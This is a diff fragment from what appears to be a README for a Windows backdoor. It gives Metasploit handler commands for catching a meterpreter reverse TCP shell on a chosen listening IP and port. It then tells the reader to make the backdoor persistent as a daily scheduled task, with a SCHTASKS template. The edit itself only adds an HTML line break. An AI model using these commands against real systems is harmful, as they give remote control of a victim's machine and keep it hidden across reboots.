@@ -18,5 +18,5 @@ msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
 msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
 msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444) <br>
 msf exploit(handler) > exploit <br>
-5. For persistence, modify the final line of code to make backdoor a scheduled task:
+5. For persistence, modify the final line of code to make backdoor a scheduled task: <br>
 SCHTASKS /CREATE /SC DAILY /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT" /ST HH:MMExampleSCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "C:\Windows\System32\notepad.exe" /ST 11:00
